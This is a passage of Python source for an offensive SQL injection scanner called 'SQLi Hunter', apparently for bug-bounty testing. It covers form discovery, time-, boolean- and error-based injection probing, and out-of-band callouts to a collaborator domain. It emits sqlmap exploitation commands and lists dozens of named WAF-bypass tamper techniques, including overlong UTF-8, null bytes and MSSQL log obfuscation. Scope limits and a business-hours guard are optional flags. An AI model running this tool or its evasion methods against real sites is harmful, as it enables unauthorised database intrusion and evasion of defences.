    if args.discover_forms and SURF_BODY_FORM in state["active_surfaces"]:
        form_targets = await _discover_forms(client, target, args)
        for ft in form_targets:
            if not args.no_post or ft.method == "GET":
                for surf in extract_surfaces(ft, {SURF_BODY_FORM}, args.max_params):
                    # recurse-lite: just error + bool + time on form surfaces
                    if args.error_probe:
                        note = await probe_error(client, ft, surf, args)
                        if note:
                            _emit(Hit(host=host, url=ft.url, method=ft.method,
                                      surface=f"{surf.kind}:{surf.name}",
                                      technique="error-based", dbms="", context="sq",
                                      payload="' vs ''", confidence=0.5, notes=note),
                                  surf, ft, args, state)
                    if args.bool_probe:
                        for dbms, ctx, tp_t, tp_f in bool_payloads:
                            note = await probe_bool(client, ft, surf, tp_t, tp_f,
                                                    args, baseline, base_len)
                            if note:
                                _emit(Hit(host=host, url=ft.url, method=ft.method,
                                          surface=f"{surf.kind}:{surf.name}",
                                          technique="bool-based", dbms=dbms, context=ctx,
                                          payload=f"true:{tp_t} / false:{tp_f}",
                                          confidence=0.55, notes=note),
                                      surf, ft, args, state)
                                break
                    if timing_ok:
                        for dbms, ctx, tpl in time_payloads_p:
                            res = await probe_time(client, ft, surf, tpl,
                                                   args, baseline, jitter)
                            if res:
                                t1, t0, t2, conf = res
                                _emit(Hit(host=host, url=ft.url, method=ft.method,
                                          surface=f"{surf.kind}:{surf.name}",
                                          technique="time-based", dbms=dbms, context=ctx,
                                          payload=tpl.format(d=args.delay),
                                          baseline=round(baseline,2),
                                          t_probe=round(t1,2), t_control=round(t0,2),
                                          t_confirm=round(t2,2), d1=args.delay,
                                          d2=args.delay2, confidence=round(conf,2)),
                                      surf, ft, args, state)
                                break
    progress["done"] += 1

async def _discover_forms(client, target, args):
    """Fetch page, parse HTML forms -> list of Target objects."""
    form_targets = []
    try:
        _, status, _ = await send_baseline(client, target, 15, args)
        if status != 200:
            return form_targets
        hdrs = {**BENIGN, **target.extra_headers, **getattr(args,"_auth",{})}
        r = await client.get(target.url, headers=hdrs, timeout=15)
        forms = _parse_forms(r.text, target.url)
        for form in forms:
            if not form["fields"]: continue
            body = urlencode(form["fields"])
            ct   = "application/x-www-form-urlencoded"
            ft   = Target(url=form["action"], method=form["method"],
                          body=body,
                          extra_headers={"Content-Type": ct,
                                         **target.extra_headers})
            form_targets.append(ft)
    except Exception:
        pass
    return form_targets

# --------------------------------------------------------------------------- #
# Output
# --------------------------------------------------------------------------- #
def _build_reqfile(surf: Surface, target: Target, outdir: str, tag: str) -> str:
    url, extra, body = surf.marker_req(target)
    sp   = urlsplit(url)
    path = (sp.path or "/") + (f"?{sp.query}" if sp.query else "")
    hdrs = {**BENIGN, **(target.extra_headers or {}), **extra}
    hdrs.pop("content-length", None); hdrs.pop("Content-Length", None)
    method = surf.form_method or target.method
    lines  = [f"{method} {path} HTTP/1.1", f"Host: {sp.netloc}"]
    for k, v in hdrs.items():
        if k.lower() in ("host","connection"): continue
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body.encode())}")
    lines += ["Connection: close", "", body or ""]
    host = host_of(target.url)
    fpath = os.path.join(outdir,"hits",
                         f"{sanitize(host)}_{sanitize(surf.name)}_{tag}.req")
    with open(fpath,"w") as fh: fh.write("\n".join(lines))
    return fpath

def _sqlmap_cmd(hit: Hit) -> str:
    tech = {"time-based":"T","bool-based":"B","error-based":"E","oob":"T,E"
            }.get(hit.technique,"T")
    dbms = f" --dbms={hit.dbms}" if hit.dbms else ""
    level = "3" if hit.surface.startswith("header:") else "2"
    return (f"sqlmap -r {hit.reqfile} --technique={tech}{dbms} "
            f"--batch --threads=10 --level={level} --risk=2")

def _report_hit(hit: Hit):
    col = {
        "time-based":  GRN,
        "bool-based":  MAG,
        "error-based": YEL,
        "oob":         CYN,
    }.get(hit.technique, WHT)
    print(f"\n{BOLD}{col}[HIT:{hit.technique}]{RST} {BOLD}{hit.host}{RST}  "
          f"surface={BOLD}{YEL}{hit.surface}{RST}  "
          f"{('dbms='+hit.dbms+'  ') if hit.dbms else ''}"
          f"conf={hit.confidence}")
    print(f"      {DIM}url:{RST} {hit.url}  {DIM}[{hit.method}]{RST}")
    if hit.technique == "time-based":
        print(f"      {DIM}timing:{RST} base={hit.baseline}s "
              f"probe({hit.d1})={hit.t_probe}s "
              f"control(0)={hit.t_control}s confirm({hit.d2})={hit.t_confirm}s")
    if hit.notes:
        print(f"      {DIM}note:{RST} {hit.notes}")
    print(f"      {DIM}payload:{RST} {hit.surface}: {CYN}{hit.payload}{RST}")

def _emit(hit: Hit, surf: Surface, target: Target, args, state):
    key = (hit.host, hit.surface, hit.technique)
    if key in state["emitted"]: return
    state["emitted"].add(key)
    if hit.technique == "time-based":
        state["confirmed"].add((hit.host, hit.surface))
    tag = (hit.dbms or hit.technique).replace("-","")[:10]
    hit.reqfile = _build_reqfile(surf, target, args.outdir, tag)
    hit.sqlmap  = _sqlmap_cmd(hit)
    with open(os.path.join(args.outdir,"hits.jsonl"),"a") as fh:
        fh.write(json.dumps(asdict(hit))+"\n")
    with open(os.path.join(args.outdir,"sqlmap_commands.sh"),"a") as fh:
        fh.write(f"# {hit.host} [{hit.surface}] {hit.technique} conf={hit.confidence}\n"
                 f"# {hit.sqlmap}\n\n")
    state["hits"].append(hit)
    _report_hit(hit)

def _log_oob(args, entry):
    with open(os.path.join(args.outdir,"oob_correlation.jsonl"),"a") as fh:
        fh.write(json.dumps(entry)+"\n")
    p = os.path.join(args.outdir,"oob_correlation.csv")
    new = not os.path.exists(p)
    with open(p,"a",newline="") as fh:
        w = csv.writer(fh)
        if new:
            w.writerow(["token","subdomain","host","url","method","surface",
                        "dbms","context","payload","time"])
        w.writerow([entry[k] for k in ("token","subdomain","host","url","method",
                                        "surface","dbms","context","payload","time")])

def _finalize(state, outdir):
    hits = state["hits"]
    with open(os.path.join(outdir,"hits.json"),"w") as fh:
        json.dump([asdict(h) for h in hits],fh,indent=2)
    with open(os.path.join(outdir,"hits.csv"),"w",newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["host","surface","technique","dbms","context","confidence",
                    "baseline","probe","control","confirm","notes","url","reqfile"])
        for h in hits:
            w.writerow([h.host,h.surface,h.technique,h.dbms,h.context,
                        h.confidence,h.baseline,h.t_probe,h.t_control,
                        h.t_confirm,h.notes,h.url,h.reqfile])

# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #
async def scan(targets, header_names, time_payloads_h, time_payloads_p,
               bool_payloads, oob_payloads_h, oob_payloads_p, args, state):
    limits = httpx.Limits(max_connections=args.concurrency+10,
                          max_keepalive_connections=args.concurrency)
    gsem      = asyncio.Semaphore(args.concurrency)
    host_sems = {}
    progress  = {"done":0,"total":len(targets)}
    deadline  = time.time()+args.max_runtime if args.max_runtime else None

    async with httpx.AsyncClient(verify=False, follow_redirects=True,
                                  limits=limits,
                                  proxy=args.proxy or None) as client:
        async def worker(tg):
            if deadline and time.time() > deadline:
                progress["done"] += 1; return
            h = host_of(tg.url)
            hsem = host_sems.setdefault(h, asyncio.Semaphore(args.per_host))
            async with gsem, hsem:
                await test_target(client, tg, header_names,
                                  time_payloads_h, time_payloads_p,
                                  bool_payloads, oob_payloads_h, oob_payloads_p,
                                  args, state, progress)
        tasks = [asyncio.create_task(worker(t)) for t in targets]
        while any(not t.done() for t in tasks):
            if _TTY:
                surfs_str = ",".join(sorted(state["active_surfaces"]))
                print(f"\r{DIM}  {progress['done']}/{progress['total']} "
                      f"targets | hits:{len(state['hits'])} "
                      f"oob:{state['oob_idx']}{RST}",
                      end="", flush=True)
            await asyncio.sleep(0.5)
        await asyncio.gather(*tasks)
        if _TTY: print(f"\r{' '*74}\r", end="")

# --------------------------------------------------------------------------- #
# Rebuild OOB request
# --------------------------------------------------------------------------- #
def rebuild_req(args):
    p = os.path.join(args.outdir,"oob_correlation.jsonl")
    if not os.path.exists(p):
        sys.exit(f"[!] {p} not found (run a scan with --collab first)")
    entry = None
    for line in open(p):
        e = json.loads(line)
        if e["token"] == args.rebuild_req or e.get("subdomain","").startswith(args.rebuild_req):
            entry = e; break
    if not entry:
        sys.exit(f"[!] token {args.rebuild_req} not found in correlation log")
    surf_key = entry.get("surface","header:User-Agent")
    kind, name = surf_key.split(":",1) if ":" in surf_key else (SURF_HEADER, surf_key)
    surf = Surface(kind, name, "")
    tg   = Target(url=entry["url"], method=entry["method"],
                  body=entry.get("body",""))
    hit  = Hit(host=entry["host"], url=tg.url, method=tg.method,
               surface=surf_key, technique="oob", dbms=entry["dbms"],
               context=entry["context"], payload=entry["payload"],
               confidence=1.0,
               notes=f"OOB confirmed via {entry['subdomain']}")
    hit.reqfile = _build_reqfile(surf, tg, args.outdir,
                                 f"oob_{entry['token']}")
    hit.sqlmap  = _sqlmap_cmd(hit)
    print(f"{BOLD}{GRN}[OOB CONFIRMED]{RST} {hit.host} [{hit.surface}]")
    print(f"  req:    {hit.reqfile}")
    print(f"  sqlmap: {hit.sqlmap}")

# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(
        description="Comprehensive SQLi triage -- headers, params, body, JSON, cookies.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("input", nargs="?", help="targets file (domains and/or URLs)")
    ap.add_argument("-o","--outdir", default="sqli_hunter_out")
    # input modes
    ap.add_argument("--urls-only",      action="store_true")
    ap.add_argument("--harvest",        action="store_true",
                    help="harvest endpoints from every input line regardless of format")
    ap.add_argument("--requests-dir",   help="folder of raw HTTP request files")
    ap.add_argument("--req-scheme",     default="https")
    ap.add_argument("--max-per-host",   type=int, default=12)
    # harvest tuning
    ap.add_argument("--harvest-depth",   type=int, default=2)
    ap.add_argument("--harvest-workers", type=int, default=5)
    ap.add_argument("--harvest-timeout", type=int, default=120)
    ap.add_argument("--harvest-js-max",  type=int, default=20)
    ap.add_argument("--no-harvest-js",   action="store_true")
    ap.add_argument("--passive-harvest", action="store_true",
                    help="gau/waybackurls only -- no active crawlers")
    # surfaces
    ap.add_argument("--surfaces", default="headers,query,body,json,cookies",
                    help="comma list: headers,query,body,json,cookies")
    ap.add_argument("--no-headers",      action="store_true")
    ap.add_argument("--discover-forms",  action="store_true",
                    help="fetch each page and parse HTML forms for additional body surfaces")
    ap.add_argument("--test-cookies",    action="store_true",
                    help="test cookie values (default off -- may log you out)")
    ap.add_argument("--max-params",      type=int, default=20,
                    help="max parameters to test per URL per surface type")
    # headers
    ap.add_argument("--headers",      help="comma list of headers to test")
    ap.add_argument("--headers-full", action="store_true")
    # payloads
    ap.add_argument("--dbms", default="mysql,mssql,postgres", help="mysql,mssql,postgres,oracle,sqlite or all")
    ap.add_argument("--tamper",        action="store_true",
                    help="enable WAF-bypass payload variants (sets --tamper-level 1)")
    ap.add_argument("--tamper-level",  type=int, default=1, choices=[1,2,3],
                    help="1=space+case  2=+version-comments+whitespace-alts  "
                         "3=+kwsplit+urlencode+scientific  (requires --tamper)")
    ap.add_argument("--tamper-list",   action="store_true",
                    help="print available named tamper functions and exit")
    ap.add_argument("--tampers",       default="",
                    help="comma list of named tampers to apply instead of --tamper-level "
                         "(e.g. versioncomment,space2tab,kwsplit)")
    ap.add_argument("--param-pollution", action="store_true",
                    help="duplicate each query param with a clean value to bypass "
                         "WAFs that only inspect the first occurrence")
    ap.add_argument("--bool-probe",    action="store_true", default=True,
                    help="enable boolean-based probe for params (default on)")
    ap.add_argument("--no-bool-probe", dest="bool_probe", action="store_false")
    ap.add_argument("--no-error-probe",dest="error_probe",action="store_false")
    ap.set_defaults(error_probe=True)
    # OOB
    ap.add_argument("--collab",      help="OOB collaborator domain")
    ap.add_argument("--no-oob",      action="store_true")
    ap.add_argument("--rebuild-req", metavar="TOKEN")
    # auth
    ap.add_argument("--cookie",  help="Cookie header on every request")
    ap.add_argument("--header",  action="append", default=[], metavar="K:V")
    # timing
    ap.add_argument("--delay",             type=int,   default=5)
    ap.add_argument("--delay2",            type=int,   default=10)
    ap.add_argument("--baseline-samples",  type=int,   default=3)
    ap.add_argument("--candidate-factor",  type=float, default=0.6)
    ap.add_argument("--max-baseline",      type=float, default=6.0)
    ap.add_argument("--verify-hits",       type=int,   default=1)
    # speed/safety
    ap.add_argument("--concurrency",  type=int,   default=25)
    ap.add_argument("--per-host",     type=int,   default=2)
    ap.add_argument("--rate",         type=float, default=0.0)
    ap.add_argument("--jitter",       type=float, default=0.0)
    ap.add_argument("--max-runtime",  type=int,   default=0)
    ap.add_argument("--skip-404",     action="store_true")
    ap.add_argument("--respect-hours",action="store_true")
    ap.add_argument("--no-post",      action="store_true")
    ap.add_argument("--method",       default="GET")
    ap.add_argument("--proxy",        help="http://127.0.0.1:8080")
    ap.add_argument("--scope",        help="comma list of domain suffixes / re:REGEX")
    ap.add_argument("--no-auto-scope",action="store_true")
    ap.add_argument("--test-all",     dest="stop_on_hit", action="store_false",
                    help="don't stop at first hit per (host, surface)")
    ap.set_defaults(stop_on_hit=True)
    args = ap.parse_args()

    banner()
    os.makedirs(os.path.join(args.outdir,"hits"), exist_ok=True)

    if getattr(args,"tamper_list",False):
        print(f"\n{BOLD}Available named tampers (--tampers name1,name2,...){RST}\n")
        descs = {
            # space
            "space2comment":    "space -> /**/",
            "space2tab":        "space -> %09 (tab)",
            "space2newline":    "space -> %0a (newline)",
            "space2hash":       "space -> %23%0a (hash comment+newline) [MySQL]",
            "space2dash":       "space -> --rnd\n (comment flush) [MySQL]",
            "space2plus":       "space -> + (URL query context)",
            "space2mssqlblank": "space -> random %01-%0f blank [MSSQL]",
            "space2mysqldash":  "space -> --+-\n [MySQL]",
            "space2morecomment":"space -> /**_**/",
            "space2randomblank":"space -> random tab/CR/LF/VT/FF",
            "multiplespaces":   "add multiple spaces around keywords (tokenizer confusion)",
            # case
            "mixcase":          "alternate UPPER/lower on keywords",
            "randomcase":       "truly random case per keyword char",
            "uppercase":        "uppercase all keywords",
            "lowercase":        "lowercase all keywords",
            # comments / structure
            "randomcomments":   "S/**/E/**/L/**/E/**/C/**/T -- per-char inline comments",
            "commentbeforeparens": "SLEEP/**/(5) -- comment before every paren",
            "versioncomment":   "wrap whole expression in /*!50000...*/  [MySQL, strong]",
            "bangcomment":      "/*!FUNC*/(arg) -- bang-comment around functions",
            "versionedkeywords":"/*!KEYWORD*/ per keyword [MySQL, lighter]",
            "versionedmore":    "/*!50000KEYWORD*/ per keyword [MySQL]",
            "modsec0versioned": "/*!0KEYWORD*/ -- zero-versioned, specific ModSec bypass",
            "kwsplit":          "SL/**/EEP -- break keyword with inline comment",
            # logic / comparison
            "symboliclogical":  "AND->&&  OR->||",
            "equaltolike":      "= -> LIKE (equality check bypass)",
            "greatest":         "> -> GREATEST(a,b) (comparison bypass)",
            "least":            "> -> LEAST variant",
            "between":          "1=1 -> 1 BETWEEN 1 AND 1",
            # encoding
            "urlencode":        "URL-encode SQL punctuation",
            "dblurlencode":     "double-URL-encode (WAFs that decode once)",
            "charunicodeencode":"' -> %u0027 (IIS Unicode bypass)",
            "charunicodeescape":"' -> \\u0027 (framework unescape bypass)",
            "htmlencode":       "' -> &#x27; (double-decode HTML contexts)",
            "overlongutf8":     "overlong UTF-8: ' -> %c0%a7 (ASCII-only WAF bypass)",
            "appendnullbyte":   "append %00 (legacy IIS NULL byte trick)",
            "percentage":       "%S%E%L%E%C%T (IIS/ASP.NET bypass)",
            # misc
            "scientific":       "1 UNION -> 1e0UNION (no-whitespace separator)",
            "nonrecursiverep":  "SELSELECTECT -- single-pass WAF strip leaves SELECT",
            "pgdollar":         "' -> $$ (PostgreSQL dollar-quoting)",
            "sp_password":      "append -- sp_password (MSSQL log obfuscation)",
        }
        for name, desc in descs.items():
            print(f"  {BOLD}{name:<18}{RST} {desc}")
        print(f"\n{DIM}"
              f"Level 1: space2comment + mixcase (4 variants)\n"
              f"Level 2: +versioncomment +bangcomment +whitespace-alts "
              f"+modsec0versioned +space2randomblank +symboliclogical +multiplespaces\n"
              f"Level 3: +kwsplit +urlencode +scientific +randomcomments "
              f"+nonrecursiverep +charunicodeencode +versionedmore +commentbeforeparens +randomcase"
              f"{RST}\n")
        return

    if args.rebuild_req:
        rebuild_req(args); return

    if not args.input and not args.requests_dir:
        sys.exit("[!] provide an input file and/or --requests-dir")

    # ---- business-hours guard ----
    if args.respect_hours:
        try:
            from zoneinfo import ZoneInfo
            now_et = datetime.now(ZoneInfo("America/New_York"))
        except Exception as e:
            sys.exit(f"[!] --respect-hours: cannot load tz ({e}). pip install tzdata")
        if _in_business_hours(now_et):
            sys.exit(f"[!] {now_et:%a %H:%M %Z} is inside business hours. "
                     f"Testing blocked without written approval.")
        print(f"{DIM}[*] respect-hours: {now_et:%a %H:%M %Z} is outside hours -- OK{RST}")

    # ---- OOB ----
    if args.no_oob: args.collab = None
    elif not args.collab and _TTY:
        try:
            ans = input(f"{BOLD}[?]{RST} Synack collaborator domain (blank=skip OOB): ").strip()
            args.collab = ans or None
        except EOFError:
            args.collab = None
    if args.collab:
        args.collab = args.collab.strip().lstrip(".")
        print(f"{DIM}[*] OOB -> *.{args.collab}{RST}")

    # ---- proxy ----
    if args.proxy:
        print(f"{DIM}[*] proxy -> {args.proxy}  (turn off Burp Intercept){RST}")

    # ---- scope-safety rails ----
    if args.no_post and args.method.upper() != "GET":
        print(f"{YEL}[*] --no-post: overrides --method {args.method} -> GET{RST}")
        args.method = "GET"
    if args.passive_harvest:
        print(f"{DIM}[*] passive-harvest: active crawlers disabled{RST}")
    if args.no_post:
        print(f"{DIM}[*] no-post: GET-only; form-submission replay skipped{RST}")

    # ---- auth ----
    args._auth = {}
    if args.cookie: args._auth["Cookie"] = args.cookie
    for kv in args.header:
        if ":" in kv:
            k, v = kv.split(":",1); args._auth[k.strip()] = v.strip()

    # ---- rate limiter ----
    args._rate = HostRateLimiter(args.rate)

    # ---- active surfaces ----
    raw_surfs = {s.strip() for s in args.surfaces.split(",")}
    surf_map  = {
        "headers": SURF_HEADER,
        "query":   SURF_QUERY,
        "body":    SURF_BODY_FORM,
        "json":    SURF_BODY_JSON,
        "cookies": SURF_COOKIE,
    }
    active_surfaces = {surf_map[k] for k in raw_surfs if k in surf_map}
    if args.no_headers:    active_surfaces.discard(SURF_HEADER)
    if not args.test_cookies: active_surfaces.discard(SURF_COOKIE)
    if args.no_post:       active_surfaces.discard(SURF_BODY_FORM)
    if args.no_post:       active_surfaces.discard(SURF_BODY_JSON)
    if not active_surfaces:
        sys.exit("[!] No surfaces to test. Check --surfaces / --no-headers / --no-post.")

    # ---- header list ----
    if args.headers:    header_names = [h.strip() for h in args.headers.split(",") if h.strip()]
    elif args.headers_full: header_names = FULL_HEADERS
    else:               header_names = DEFAULT_HEADERS

    # ---- payload selection ----
    want = ({"mysql","mssql","postgres","oracle","sqlite"}
            if args.dbms.strip().lower() == "all"
            else {d.strip().lower() for d in args.dbms.split(",") if d.strip()})
    # resolve tamper functions
    _custom_tampers = None
    if getattr(args,"tampers",""):
        _custom_tampers = [TAMPER_NAMES[n.strip()] for n in args.tampers.split(",")
                           if n.strip() in TAMPER_NAMES]
        if not _custom_tampers:
            print(f"{YEL}[!] --tampers: no valid names found; use --tamper-list{RST}")
    _tlevel = getattr(args,"tamper_level",1)

    def _pick_time(raw):
        out = []
        for dbms, ctx, tpl in raw:
            if dbms not in want: continue
            if args.tamper or _custom_tampers:
                for v in tamper_variants(tpl, level=_tlevel, custom=_custom_tampers):
                    out.append((dbms, ctx, v))
            else:
                out.append((dbms, ctx, tpl))
        return out
    def _pick_oob(raw):
        return [(d,c,t) for d,c,t in raw if d in want]
    def _pick_bool(raw):
        return [(d,c,tt,tf) for d,c,tt,tf in raw if d in want]

    time_payloads_h  = _pick_time(HDR_TIME)
    time_payloads_p  = _pick_time(PARAM_TIME)
    bool_payloads    = _pick_bool(BOOL_PAIRS) if args.bool_probe else []
    oob_payloads_h   = _pick_oob(HDR_OOB)  if args.collab else []
    oob_payloads_p   = _pick_oob(PARAM_OOB) if args.collab else []

    if not time_payloads_h and not time_payloads_p:
        sys.exit("[!] No payloads -- check --dbms")

    # ---- build target list ----
    targets, scope_domains, url_pool = [], set(), []
    if args.input:
        if args.input.startswith(("http://","https://")):
            # ---- Single URL or URL + --harvest passed on the command line ----
            url   = args.input
            host  = _host_only(url)
            scope_domains.add(reg_domain(host_of(url)))
            if args.harvest:
                print(f"{DIM}[*] harvesting {host} (from URL)...{RST}")
                harvested, stats = harvest_domain(host, args)
                line = " ".join(f"{k}:{v}" for k,v in stats.items()) or "no tools"
                print(f"{DIM}    [{host}] {line}  -> {len(harvested)} urls{RST}")
                for u in prioritize(list(harvested), args.max_per_host):
                    targets.append(Target(url=u, method=args.method,
                                          extra_headers=dict(args._auth)))
                print(f"{DIM}[*] {len(harvested)} urls -> "
                      f"{len(targets)} after filter+sample({args.max_per_host}/host){RST}")
            else:
                targets.append(Target(url=url, method=args.method,
                                      extra_headers=dict(args._auth)))
                print(f"{DIM}[*] single URL: {url}{RST}")
        elif _is_burp_xml(args.input):
            print(f"{DIM}[*] Burp XML detected -> parsing items...{RST}")
            xml_tgts = parse_burp_xml(args.input, args.req_scheme)
            if not xml_tgts:
                print(f"{YEL}[!] No usable items in Burp XML (check format).{RST}")
            for tg in xml_tgts:
                if args.no_post and tg.method != "GET": continue
                h = host_of(tg.url)
                if h: scope_domains.add(reg_domain(h))
                tg.extra_headers.update(args._auth)
                targets.append(tg)
            if xml_tgts:
                print(f"{DIM}[*] {len(targets)} target(s) loaded from Burp XML{RST}")
        else:
            domains, ready = load_targets(args.input)
            for u in ready: scope_domains.add(reg_domain(host_of(u)))
            for d in domains: scope_domains.add(reg_domain(d))
            if args.urls_only:
                ready += [f"https://{d}" for d in domains]; domains = []
            if args.harvest:
                domains = sorted({_host_only(u) for u in ready} |
                                 {_host_only(d) for d in domains})
                ready = []
            url_pool = list(ready)
            if domains:
                print(f"{DIM}[*] harvesting {len(domains)} domain(s) "
                      f"(depth {args.harvest_depth}, {args.harvest_workers} workers)...{RST}")
                with ThreadPoolExecutor(max_workers=args.harvest_workers) as ex:
                    for d, (urls, stats) in ex.map(
                            lambda x: (x, harvest_domain(x, args)), domains):
                        url_pool.extend(urls)
                        line = " ".join(f"{k}:{v}" for k,v in stats.items()) or "no tools"
                        print(f"{DIM}    [{_host_only(d)}] {line}  -> {len(urls)} urls{RST}")
            for u in prioritize(url_pool, args.max_per_host):
                targets.append(Target(url=u, method=args.method,
                                      extra_headers=dict(args._auth)))
            print(f"{DIM}[*] {len(url_pool)} urls -> "
                  f"{len(targets)} after filter+sample({args.max_per_host}/host){RST}")

    if args.requests_dir:
        skipped = 0
        for fn in sorted(os.listdir(args.requests_dir)):
            tg = parse_request_file(os.path.join(args.requests_dir, fn),
                                    args.req_scheme)
            if not tg: continue
            if args.no_post and tg.method.upper() != "GET":
                skipped += 1; continue
            scope_domains.add(reg_domain(host_of(tg.url)))
            targets.append(tg)
        if args.no_post and skipped:
            print(f"{DIM}[*] no-post: skipped {skipped} non-GET request file(s){RST}")

    # ---- scope guard ----
    scope_sfx, scope_res = [], []
    if args.scope:
        for s in args.scope.split(","):
            s = s.strip()
            if s.startswith("re:"): scope_res.append(re.compile(s[3:]))
            elif s: scope_sfx.append(s.lstrip("."))
    elif not args.no_auto_scope:
        scope_sfx = sorted(scope_domains)
    if scope_sfx or scope_res:
        before  = len(targets)
        targets = [t for t in targets if in_scope(t.url, scope_sfx, scope_res)]
        sc = ", ".join(scope_sfx+[f"re:{r.pattern}" for r in scope_res])
        print(f"{DIM}[*] scope: {sc}  ({before-len(targets)} dropped){RST}")

    if not targets:
        sys.exit("[!] No in-scope targets after filtering.")

    n_hosts = len({host_of(t.url) for t in targets})
    surf_display = ", ".join(sorted(active_surfaces))
    print(f"{BOLD}[*]{RST} {BOLD}{len(targets)}{RST} targets / "
          f"{BOLD}{n_hosts}{RST} hosts")
    print(f"    surfaces : {surf_display}")
    print(f"    headers  : {','.join(header_names)}" if SURF_HEADER in active_surfaces else "")
    print(f"    payloads : time-h={len(time_payloads_h)} "
          f"time-p={len(time_payloads_p)} "
          f"bool={len(bool_payloads)} "
          f"oob-h={len(oob_payloads_h)} oob-p={len(oob_payloads_p)}")
    thr = [f"SLEEP {args.delay}/{args.delay2}s"]
    if args.rate:   thr.append(f"rate={args.rate}/s/host")
    if args.jitter: thr.append(f"jitter<={args.jitter}s")
    thr.append(f"per-host={args.per_host}")
    if args.skip_404: thr.append("skip-404")
    print(f"    throttle : {', '.join(thr)}")

    # active error payloads (filtered by want dbms)
    active_err_payloads = [(d,c,t) for d,c,t in ACTIVE_ERROR_PAYLOADS if d in want]
    state = {"confirmed": set(), "emitted": set(), "hits": [],
             "status": {}, "oob_idx": 0, "skipped_404": 0,
             "active_surfaces": active_surfaces,
             "active_error_payloads": active_err_payloads}

    open(os.path.join(args.outdir,"hits.jsonl"),"w").close()
    with open(os.path.join(args.outdir,"sqlmap_commands.sh"),"w") as fh:
        fh.write("#!/usr/bin/env bash\n"
                 "# SQLi Hunter findings -- review and run individually.\n\n")
    os.chmod(os.path.join(args.outdir,"sqlmap_commands.sh"),0o755)

    t0 = time.time()
    try:
        asyncio.run(scan(targets, header_names,
                         time_payloads_h, time_payloads_p,
                         bool_payloads, oob_payloads_h, oob_payloads_p,
                         args, state))
    finally:
        _finalize(state, args.outdir)
    dur = int(time.time()-t0)

    # ---- block-rate warnings ----
    for host, c in state["status"].items():
        if c["total"] >= 5 and c["blocked"]/c["total"] > 0.3:
            print(f"{YEL}[!] {host}: {c['blocked']}/{c['total']} blocked "
                  f"(WAF/rate-limit? try --tamper --jitter){RST}")

    if state.get("skipped_404"):
        print(f"{DIM}[*] skip-404: {state['skipped_404']} URL(s) skipped{RST}")

    # ---- summary ----
    hits = state["hits"]
    print(f"\n{BOLD}{'='*64}{RST}")
    if hits:
        tb = sum(1 for h in hits if h.technique=="time-based")
        bb = sum(1 for h in hits if h.technique=="bool-based")
        eb = sum(1 for h in hits if h.technique=="error-based")
        print(f"{BOLD}{GRN}[+] {len(hits)} finding(s) in {dur}s  "
              f"(time:{tb} bool:{bb} error:{eb}){RST}")
        print(f"    req files : {args.outdir}/hits/")
        print(f"    cheat-sheet: {args.outdir}/sqlmap_commands.sh  "
              f"(review -- do NOT batch-run)")
        print(f"    json/csv  : {args.outdir}/hits.json , hits.csv")
    else:
        print(f"{YEL}[-] No findings in {dur}s.{RST}")
    if args.collab:
        print(f"\n{BOLD}{CYN}[OOB]{RST} {state['oob_idx']} callouts fired -> "
              f"watch *.{args.collab}")
        print(f"      map: {args.outdir}/oob_correlation.csv")
        print(f"      hit: python3 {os.path.basename(sys.argv[0])} "
              f"-o {args.outdir} --rebuild-req <token>")

if __name__ == "__main__":
    try:
        import warnings; warnings.filterwarnings("ignore")
        main()
    except KeyboardInterrupt:
        print(f"\n{YEL}[!] interrupted -- findings saved to disk{RST}")
        sys.exit(130)
